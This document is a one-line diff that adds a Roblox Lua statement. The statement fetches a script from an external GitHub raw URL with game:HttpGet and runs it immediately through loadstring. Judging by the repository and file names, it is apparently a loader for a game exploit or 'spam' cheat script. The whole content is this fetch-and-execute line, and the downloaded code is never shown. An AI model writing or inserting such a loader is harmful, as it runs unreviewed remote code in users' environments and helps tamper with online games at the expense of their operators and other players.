@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Swarmzorouter/loaders/main/loaders/war-of-the-worlds-spam7-l74e0dg0odypik.lua"))()
